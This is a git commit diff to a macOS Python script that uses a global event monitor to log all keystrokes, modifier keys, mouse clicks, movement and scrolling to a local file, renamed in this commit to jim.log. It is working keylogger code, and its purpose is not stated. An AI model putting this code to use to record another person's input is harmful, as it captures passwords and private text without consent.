f89606256c5ef52e5d8ee1cc8753a8c6edade7dd
System Administrator <root@Lapchopper.home>
2014-12-02 13:36:24 -0500

    Added much more to the logger, unifying scripts

--- bin/keystrokes.py
+++ bin/keystrokes.py
@@ -4,28 +4,39 @@
  
 from AppKit import NSApplication, NSApp
 from Foundation import NSObject, NSLog
-from Cocoa import NSEvent, NSKeyDownMask
+from Cocoa import (NSEvent, NSKeyDownMask, NSCommandKeyMask, NSControlKeyMask, NSAlternateKeyMask, NSShiftKeyMask, NSLeftMouseDownMask, NSRightMouseDownMask, NSMouseMovedMask, NSScrollWheelMask, NSFlagsChangedMask)
 from PyObjCTools import AppHelper
 import logging
  
 class AppDelegate(NSObject):
     def applicationDidFinishLaunching_(self, notification):
-        mask = NSKeyDownMask
+	mask = (NSKeyDownMask
+		| NSCommandKeyMask
+		| NSControlKeyMask
+		| NSAlternateKeyMask
+		| NSShiftKeyMask
+		| NSLeftMouseDownMask
+		| NSRightMouseDownMask
+		| NSMouseMovedMask
+		| NSScrollWheelMask
+		| NSFlagsChangedMask)
         NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask, handler)
  
 def handler(event):
     try:
         # logging.info(str(event))
-        logging.info(str(event).replace('\r', '<RETURN>').replace('\n', '<NEWLINE>').replace('\t', '<TAB>').replace('\" \"', '\"<SPACE>\"'))
+        logging.info(str(event).replace('\r', ' <RETURN>').replace('\n', ' <NEWLINE>').replace('\t', ' <TAB>').replace('\" \"', '\" <SPACE>\"'))
     except UnicodeEncodeError as e:
 	# logging.info(event.encode('ascii', 'xmlcharrefreplace'))
         logging.info(event)
     except KeyboardInterrupt:
         AppHelper.stopEventLoop()
+    except Exception as e:
+        logging.info(e)
  
 def main():
     app = NSApplication.sharedApplication()
-    logging.basicConfig(filename='../data/keys.log', format='%(asctime)s %(message)s', level=logging.INFO)
+    logging.basicConfig(filename='../data/jim.log', format='%(asctime)s %(message)s', level=logging.INFO)
     delegate = AppDelegate.alloc().init()
     NSApp().setDelegate_(delegate)
     AppHelper.runEventLoop()
